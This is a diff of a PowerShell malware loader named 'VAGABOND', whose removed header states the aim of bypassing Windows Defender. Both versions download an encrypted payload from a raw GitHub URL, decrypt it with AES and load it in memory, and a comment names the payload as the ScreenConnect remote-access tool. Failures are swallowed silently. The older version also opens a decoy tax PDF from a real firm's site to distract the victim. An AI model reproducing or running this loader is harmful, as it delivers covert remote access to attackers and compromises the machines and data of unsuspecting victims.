@@ -1,25 +1,7 @@
-# VAGABOND OBFUSCATED PAYLOAD - Bypass Windows Defender
-# ----------------------------------------
-# Purpose: Download, decrypt, and execute payload from GitHub
-# Method: In-memory execution with AES-256 decryption
-# ----------------------------------------
+# VAGABOND PAYLOAD LOADER - FINAL
+$kY = "VagabondPhantomKey2026Secure"
+$enc = [System.Text.Encoding]::UTF8
 
-# REPLACE THIS WITH YOUR ACTUAL RAW GITHUB URL
-$gH = "https://raw.githubusercontent.com/brakedangola2/vagabond/refs/heads/main/payload.bin" 
-
-$kY = [System.Text.Encoding]::UTF8.GetBytes("VagabondPhantomKey2026Secure")
-$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
-
-# Hex-encoded string for "System.Text.Encoding"
-$sT = [char[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x54,0x65,0x78,0x74,0x2e,0x45,0x6e,0x63,0x6f,0x64,0x69,0x6e,0x67) -join ""
-
-# Hex-encoded string for "UTF8"
-$tU = [char[]](0x55,0x54,0x46,0x38) -join ""
-
-# Get encoding object
-$enc = [Type]::GetType($sT).GetMethod("GetEncoding").Invoke($null, @($tU))
-
-# Function to decrypt data
 function D-Crypt {
     param([byte[]]$d, [string]$k)
     $h = New-Object System.Security.Cryptography.SHA256CryptoServiceProvider
@@ -39,31 +21,21 @@ function D-Crypt {
     return $d
 }
 
-# Function to download data
 function G-Data {
     param([string]$u)
     $wc = New-Object System.Net.WebClient
     return $wc.DownloadData($u)
 }
 
-# Main Execution Flow
 try {
-    # Open Decoy PDF Silently
-    Start-Process "https://www.bairdwealth.com/siteassets/pdfs/tax-information/2026-tax-facts.pdf"
+    # 1. Download the encrypted payload from GitHub
+    $rD = G-Data -u "https://raw.githubusercontent.com/brakedangola2/vagabond/refs/heads/main/payload.bin"
     
-    # Download encrypted payload
-    $rD = G-Data -u "$gH"
-    
-    # Decrypt payload
+    # 2. Decrypt the payload
     $pL = D-Crypt -d $rD -k $kY
     
-    # Execute payload in memory
-    [System.Reflection.Assembly]::Load($pL) | Out-Null
-    
-    # If it's an EXE, use this instead:
-    # $tempFile = [System.IO.Path].GetTempFileName()
-    # [System.IO.File]::WriteAllBytes($tempFile, $pL)
-    # Start-Process $tempFile
+    # 3. Execute the decrypted bytes as an EXE (ScreenConnect)
+    [System.Reflection.Assembly]::Load($pL)
 } catch {
     # Silent failure
 }
